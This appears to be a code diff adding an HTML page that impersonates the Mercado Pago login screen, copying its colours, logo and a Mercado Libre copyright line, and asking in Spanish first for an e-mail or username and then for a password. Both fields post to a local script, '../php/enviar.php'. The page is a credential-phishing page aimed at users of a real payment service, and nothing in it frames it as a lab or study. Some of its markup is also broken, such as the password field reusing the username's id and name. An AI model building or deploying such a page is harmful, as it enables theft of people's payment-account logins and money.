@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hola ! ingresa tu e-mail o usuario</title>
+    <link rel="shortcut icon" href="https://i.postimg.cc/RhfdM37P/icono.webp" type="image/x-icon">
+</head>
+<style>
+    :root {
+        --color-primary: #00b1ea;
+        --color-primary-hover: #007eb5;
+        --color-secundary: #ffffff;
+        --color-button: #009ee3;
+        --color-button-hover: #007eb5;
+        --color-error: #ef3c4c;
+        --color-gray: gray;
+        --color-button2-hover: #daebf6;
+        --color-pay: #eeeeee;
+        --color-footer-bg: #f5f5f5;
+    }
+
+    .option a:hover {
+        text-decoration: underline;
+    }
+
+    body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+
+    header {
+        height: 80px;
+        background-color: var(--color-primary);
+    }
+
+    .bienvenida {
+        margin-top: 100px;
+        text-align: center;
+        font-size: 1.5rem;
+    }
+
+    nav img {
+        width: 60px;
+        padding: 10px;
+        margin-left: 10px;
+    }
+
+    input {
+        height: 35px;
+        width: 250px;
+        border-radius: 0.375em;
+        border: solid 1px var(--color-gray);
+    }
+
+    input:focus {
+        border-color: var(--color-primary);
+    }
+
+    .container-form {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    label {
+        padding: 15px;
+    }
+
+    form {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 50px;
+    }
+
+    .continuar {
+        background-color: var(--color-button);
+        color: var(--color-secundary);
+        font-weight: bold;
+        border-radius: 4px;
+        font-weight: 600px;
+        height: 40px;
+        width: 100%;
+        border: none;
+        margin-top: 15px;
+    }
+
+    .continuar:hover {
+        background-color: var(--color-button-hover);
+    }
+
+    .registrarse {
+        font-size: 14px;
+        background-color: transparent;
+        font-weight: bold;
+        color: var(--color-button);
+        border-radius: 4px;
+        font-weight: 600px;
+        height: 40px;
+        width: 100%;
+        border: none;
+    }
+
+    .registrarse:hover {
+        background-color: var(--color-button2-hover);
+    }
+
+    .container-second-form {
+        display: none;
+        display: flex;
+        flex-direction: column !important;
+    }
+
+    .container-problem {
+        margin-top: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 50px;
+    }
+
+    .container-problem span {
+        margin-bottom: 10px;
+    }
+
+    .container-problem a {
+        color: var(--color-gray);
+        text-decoration: none;
+        padding: 3px;
+
+    }
+
+    .container-problem p {
+        color: var(--color-primary);
+    }
+
+    .container-problem strong {
+        margin-top: 5px;
+    }
+
+    .footer-container {
+        margin-top: auto;
+        background-color: var(--color-footer-bg);
+        text-align: center;
+        padding: 20px 0;
+    }
+
+    .footer-container p {
+        color: var(--color-gray);
+        font-size: 12px;
+    }
+
+    .footer-container strong {
+        font-size: 11px;
+    }
+
+    strong {
+        color: var(--color-primary);
+    }
+
+    footer {
+        display: inline-block;
+    }
+
+    .azulado {
+        color: var(--color-primary);
+    }
+</style>
+
+<body>
+
+    <header>
+        <nav>
+            <img src="https://i.postimg.cc/RhfdM37P/icono.webp" alt="el logo de mercadopago">
+        </nav>
+    </header>
+
+    <h1 style="margin-top: 100px;" class="bienvenida">Ingresá tu e‑mail, teléfono o <br> usuario de Mercado Pago</h1>
+
+    <form action="../php/enviar.php" method="post">
+        <div id="container-form" class="container-form">
+            <label for="email-usuario">Email, telefono o usuario</label>
+            <input type="text" id="email-usuario" name="email-usuario">
+            <button class="continuar" type="button" onclick="mostrarContraseñaInput()">Continuar</button>
+            <button class="registrarse">Crear cuenta</button>
+        </div>
+
+        <div style="display: none;" id="container-second-form" class="container-form">
+            <label for="email-usuario">Contraseña</label>
+            <input type="text" id="email-usuario" name="email-usuario">
+            <button class="continuar" type="button">Continuar</button>
+        </div>
+    </form>
+
+
+
+
+    <div class="footer-container">
+        <footer>
+            <p>Protegido por reCAPTCHA - <strong>Privacidad - Condiciones</strong></p>
+            <strong>Como cuidamos tu privacidad</strong>
+            <p>Copyright © 1999-2024 Mercadolibre S.R.L</p>
+        </footer>
+    </div>
+
+    <script>function mostrarContraseñaInput() {
+            document.getElementById('container-form').style.display = 'none';
+            document.getElementById('container-second-form').style.display = 'block';
+        }</script>
+</body>
+
+</html>
